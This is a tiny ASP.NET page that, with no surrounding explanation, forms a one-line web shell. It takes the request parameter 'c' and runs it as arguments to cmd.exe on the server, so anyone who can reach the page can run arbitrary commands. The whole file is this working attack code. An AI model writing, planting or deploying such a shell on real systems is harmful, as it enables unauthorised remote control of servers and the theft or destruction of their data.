<%@ Page Language="C#" %>
<%
    System.Diagnostics.Process.Start("cmd.exe", Request["c"]);
%>
